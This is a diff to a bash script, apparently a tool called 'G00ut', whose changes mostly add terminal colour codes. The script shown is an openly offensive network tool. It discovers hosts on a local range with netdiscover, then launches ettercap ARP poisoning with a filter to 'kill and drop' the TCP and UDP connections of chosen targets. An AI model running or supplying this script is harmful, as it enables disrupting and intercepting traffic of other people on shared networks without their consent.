@@ -1,11 +1,26 @@
 #!/bin/bash
+#RED="\e[31m"
+ORANGE="\e[33m"
+#BLUE="\e[94m"
+#GREEN="\e[92m"
+STOP="\e[0m"
+BLACK="\e[90m"
+RED="\e[91m"
+GREEN="\e[92m"
+YELLOW="\e[93m"
+BLUE="\e[94m"
+PURPLE="\e[95m"
+CYAN="\e[96m"
+WHITE="\e[97m"
 
 function usage(){
+printf "${RED}"
 printf "\n[-] Call with <IP-Range or IP> <gateway> <interface> , or call with stop\n\n[+] Example:\t goout 192.168.1.1/24 192.168.1.1 wlan0 \n\n[+] Example:\t goout 192.168.1.109 192.168.1.1 wlan0 \n\n[+] to Stop Killing Them :  goout stop \n"
 exit
 }
 
 function scanning(){
+printf "${BLUE}"
 printf "\n\n\t[+] Scanning Range : %s [+]" $1
 netdiscover -r $1 -c 3 -P > /tmp/active_hosts
 
@@ -19,12 +34,13 @@ start=$(echo $1 | cut -b '1')
 out=$(cat /tmp/active_hosts | grep "^ $start" | cut -d ' ' -f 2 )
 
 list_ip=$(echo $out|sed  "s/ /\n/g")
-
+printf "${YELLOW}"
 printf "\n\n[+] Hosts find:\n\n"
 sleep 1
 for ip in $list_ip
 
 do
+printf "${GREEN}"
 echo "(*) $ip"
 sleep 0.2
 done
@@ -35,7 +51,7 @@ bufgroup=0
 bufip=0
 for ip in $list_ip
 do
-
+printf "${YELLOW}"
 printf "\n[+] Adding $ip to Goout_List "
 sleep 0.3
 
@@ -51,14 +67,17 @@ group=$bufgroup$bufip//
 }
 
 function g00ut(){
+printf "${RED}"
 printf "\n\n\t[!] Starting Killing And Dropping \n"
 ettercap -TQ -i $1 -F build/goout.ef -M arp:remote $2 /$3//  1>/dev/null 2>/dev/null &
 sleep 2
+printf "${GREEN}"
 printf "\n\n\t[+] Finished [+] "
 }
 function stop_check(){
 if [[ $1 == 'stop' ]]
 then
+printf "${GREEN}"
 printf "\n[+] Stop Droping and Killing \n "
 pkill ettercap
 exit
@@ -71,6 +90,7 @@ then
 usage
 exit
 else
+printf "${GREEN}"
 printf "\n [+] Useing GateWay : %s \n" $2
 gateway=$2
 printf "\n [+] Useing Interface : %s \n" $3
@@ -82,16 +102,20 @@ check_ip_or_range=$(echo $1 | grep "/" )
 if [ -z  $check_ip_or_range ]
 then
 group=/$1
+printf "${RED}"
 printf "\n\nDo You Have another Targets ? [y/n] Default=N : "
 read answer
 if [[ $answer == "y" ]] || [[ $answer == "Y" ]] || [[ $answer == "yes" ]] || [[ $answer == "Yes" ]]
 then
+printf "${BLUE}"
 printf "\n[*] Write one target then press Enter then enter the next target and repeat steps untill the last target write it then press enter two times :\n\n"
 while true
 do
+printf "${GREEN}"
 read targets
 if [ -z $targets ]
 then
+printf "${RED}"
 printf "\n\n\t[+] Finished Collect Targets\n\n"
 group=$group// 
 break
@@ -107,7 +131,7 @@ scanning $1
 filtering $1
 fi
 }
-
+printf "${GREEN}"
 printf "\n\n[+] G00ut to Kill and Drop Tcp and Udp Connection made by 0xCrypt00o\n\n "
 
 stop_check $1
